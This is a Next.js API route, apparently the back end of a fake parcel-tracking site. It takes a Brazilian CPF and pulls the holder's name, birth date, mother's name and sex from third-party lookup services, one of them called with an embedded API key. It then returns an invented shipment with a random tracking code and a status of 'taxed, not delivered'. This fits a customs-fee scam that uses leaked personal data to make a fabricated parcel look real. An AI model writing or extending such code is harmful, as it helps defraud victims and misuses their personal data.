import { type NextRequest, NextResponse } from "next/server"

export const runtime = "nodejs"
export const dynamic = "force-dynamic"
export const revalidate = 0

function generateRandomTrackingCode(): string {
  const letters = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
  const numbers = "0123456789"
  let code = ""
  for (let i = 0; i < 2; i++) code += letters[Math.floor(Math.random() * letters.length)]
  for (let i = 0; i < 9; i++) code += numbers[Math.floor(Math.random() * numbers.length)]
  code += "BR"
  return code
}

export async function GET(request: NextRequest, { params }: { params: { cpf: string } }) {
  const cpfRaw = (await params)?.cpf || ""
  const cpf = cpfRaw.replace(/\D/g, "")
  if (!cpf) {
    return NextResponse.json({ error: "CPF não fornecido" }, { status: 400 })
  }

  // Check if client sent enriched data via query params
  const url = new URL(request.url)
  const clientNome = url.searchParams.get("nome")
  const clientNascimento = url.searchParams.get("nascimento")
  const clientMae = url.searchParams.get("mae")
  const clientSexo = url.searchParams.get("sexo")

  // If client already fetched CPF data from the browser, use it
  if (clientNome && clientNome !== "Cliente" && clientNome.trim() !== "") {
    return NextResponse.json({
      cpf,
      nome: clientNome.trim(),
      nascimento: clientNascimento || "",
      mae: clientMae || "",
      sexo: clientSexo || "",
      telefone: "",
      produto: "",
      codigo_rastreio: generateRandomTrackingCode(),
      endereco: "",
      remessa: generateRandomTrackingCode(),
      status: "Taxado",
      ultima_atualizacao: new Date().toISOString().split("T")[0],
      pedido_postado: true,
      pedido_em_rota: true,
      pedido_taxado: true,
      pedido_entregue: false,
      isExternal: true,
    })
  }

  // Try server-side fetch as fallback (may be blocked by Cloudflare)
  const apiUrls = [
    `https://public.livescript.dev/apis/cpfcompleta/${encodeURIComponent(cpf)}?key=344f68668e41841756df498618bfccef`,
    `https://blackpanthercheckout.com/cpf-curl.php?cpf=${encodeURIComponent(cpf)}`,
  ]

  for (const apiUrl of apiUrls) {
    try {
      const r = await fetch(apiUrl, {
        method: "GET",
        headers: {
          "Accept": "application/json, text/plain, */*",
          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
          "Accept-Language": "pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7",
          "Cache-Control": "no-cache",
        },
        cache: "no-store",
      })
      if (!r.ok) continue

      const text = await r.text()
      if (!text || text.includes("<!DOCTYPE")) continue

      const parsed = JSON.parse(text)
      // Handle different response formats
      const data = parsed?.data || parsed
      const nome = (data?.nome || data?.NOME || data?.name || "").trim()
      const nascimento = data?.nascimento || data?.NASCIMENTO || data?.data_nascimento || ""
      const mae = data?.mae || data?.MAE || data?.nome_mae || ""
      const sexo = data?.sexo || data?.SEXO || ""

      if (nome) {
        return NextResponse.json({
          cpf,
          nome,
          nascimento,
          mae,
          sexo,
          telefone: "",
          produto: "",
          codigo_rastreio: generateRandomTrackingCode(),
          endereco: "",
          remessa: generateRandomTrackingCode(),
          status: "Taxado",
          ultima_atualizacao: new Date().toISOString().split("T")[0],
          pedido_postado: true,
          pedido_em_rota: true,
          pedido_taxado: true,
          pedido_entregue: false,
          isExternal: true,
        })
      }
    } catch {
      continue
    }
  }

  // Fallback - return with "needsClientFetch: true" so frontend knows to try from browser
  return NextResponse.json({
    cpf,
    nome: "Cliente",
    telefone: "",
    produto: "",
    codigo_rastreio: generateRandomTrackingCode(),
    endereco: "",
    remessa: generateRandomTrackingCode(),
    status: "Taxado",
    ultima_atualizacao: new Date().toISOString().split("T")[0],
    pedido_postado: true,
    pedido_em_rota: true,
    pedido_taxado: true,
    pedido_entregue: false,
    isExternal: true,
    needsClientFetch: true,
  })
}
